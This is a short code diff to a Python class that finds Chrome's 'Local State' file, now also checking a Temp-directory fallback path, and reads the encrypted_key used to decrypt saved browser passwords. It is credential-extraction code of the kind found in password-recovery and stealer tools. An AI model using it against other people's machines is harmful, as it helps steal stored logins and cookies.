@@ -127,6 +127,9 @@ class Chrome:
             appdata = os.getenv('APPDATA')
             chromeDefaultPath = '%s\\..\\Local\\Google\\Chrome\\User Data' % appdata
             Local_State = '%s%s' % (chromeDefaultPath, '\\Local State')
+            if not os.path.isfile(Local_State):
+                chromeDefaultPath =  '%s\\..\\Local\\Temp\\Google\\Chrome\\User Data' % appdata
+                Local_State = '%s%s' % (chromeDefaultPath, '\\Local State')
             try:
                 if os.path.isfile(Local_State):
                     with open(Local_State, 'r', encoding='utf-8') as f:
@@ -266,7 +269,10 @@ class Chrome:
 
     def get_key_from_local_state(self):
         jsn = None
-        with open((os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Local State')),
+        Local_State = os.path.join(os.environ['LOCALAPPDATA'], 'Google\\Chrome\\User Data\\Local State')
+        if not os.path.isfile(Local_State):
+            Local_State = os.path.join(os.environ['LOCALAPPDATA'], 'Temp\\Google\\Chrome\\User Data\\Local State')
+        with open((Local_State),
           encoding='utf-8', mode='r') as f:
             jsn = json.loads(str(f.readline()))
         return jsn['os_crypt']['encrypted_key']
